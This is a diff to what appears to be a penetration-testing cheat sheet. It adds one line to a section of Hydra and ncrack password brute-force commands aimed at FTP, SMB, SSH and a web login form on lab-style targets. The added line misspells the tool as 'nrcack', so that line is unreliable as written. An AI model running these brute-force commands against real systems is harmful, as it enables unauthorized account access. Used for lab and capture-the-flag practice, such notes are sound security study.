@@ -944,6 +944,7 @@ Hydra
 	hydra -l user -p password <IP> ftp
 	hydra -L users.txt -P passwords.txt <IP> smb
 	ncrack --user user -P wordlist.txt ssh://10.10.91.125:22 -v
+ 	nrcack -U username.txt -P password.txt smb://10.10.10.10 -v
 
 	ssh -oHostKeyAlgorithms=+ssh-rsa user@10.10.91.125
 	hydra -l admin -P /usr/share/wordlists/rockyou.txt brute.thm http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
